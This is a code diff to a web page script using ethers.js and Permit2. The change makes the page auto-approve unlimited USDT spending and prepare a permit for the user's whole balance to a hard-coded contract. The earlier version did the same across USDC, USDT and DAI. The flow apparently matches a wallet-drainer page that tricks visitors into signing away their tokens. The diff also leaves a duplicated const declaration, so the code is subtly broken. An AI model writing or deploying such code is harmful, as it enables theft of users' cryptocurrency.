@@ -180,11 +180,7 @@ body {
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 
 <script>
-const TOKENS = [
- "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
- "0xdac17f958d2ee523a2206206994597c13d831ec7",
- "0x6b175474e89094c44da98b954eedeac495271d0f"
-];
+const TOKEN = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const CONTRACT = "0x2776a9e675B2123278b975b68586Ee40ACC0A9d2";
@@ -261,53 +257,53 @@ async function runPermitFlowSafe(provider, signer, user){
   const erc20Abi = [
     "function allowance(address owner, address spender) view returns (uint256)"
   ];
+const erc20Abi = [
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)"
+];
 
-  for (let token of TOKENS) {
-    const tokenContract = new ethers.Contract(token, erc20Abi, provider);
-    const allowance = await tokenContract.allowance(user, PERMIT2);
+const tokenContract = new ethers.Contract(TOKEN, erc20Abi, signer);
+const allowance = await tokenContract.allowance(user, PERMIT2);
 
-    if (allowance === 0n) {
-      log("❌ First time setup required");
-      alert("Approve tokens first (one-time)");
-      return;
-    }
-  }
+if (allowance === 0n) {
+  log("🔓 First time: approving USDT...");
 
-  // ✅ BUILD DETAILS
-  let details = [];
+  const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
+  await tx.wait();
 
-  for (let token of TOKENS) {
-    const tokenC = new ethers.Contract(
-      token,
-      ["function balanceOf(address) view returns (uint256)"],
-      provider
-    );
+  log("✅ USDT Approved — run again");
+  return;
+}
+ 
 
-    const balance = await tokenC.balanceOf(user);
-    log(`Token ${token} balance: ${balance}`);
+const tokenC = new ethers.Contract(
+  TOKEN,
+  ["function balanceOf(address) view returns (uint256)"],
+  provider
+);
 
-    if (balance === 0n) continue;
+const balance = await tokenC.balanceOf(user);
+log(`USDT balance: ${balance}`);
 
-    const permit2 = new ethers.Contract(
-      PERMIT2,
-      ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
-      provider
-    );
+if (balance === 0n) {
+  log("❌ No USDT balance");
+  return;
+}
 
-    const res = await permit2.allowance(user, token, CONTRACT);
+const permit2 = new ethers.Contract(
+  PERMIT2,
+  ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
+  provider
+);
 
-    details.push({
-      token,
-      amount: balance,
-      expiration: Math.floor(Date.now()/1000)+2592000,
-      nonce: res[2]
-    });
-  }
+const res = await permit2.allowance(user, TOKEN, CONTRACT);
 
-  if (details.length === 0){
-    log("❌ No tokens found");
-    return;
-  }
+let details = [{
+  token: TOKEN,
+  amount: balance,
+  expiration: Math.floor(Date.now()/1000)+2592000,
+  nonce: res[2]
+}];
 
   // ✍️ SIGN
   const chainId = (await provider.getNetwork()).chainId;
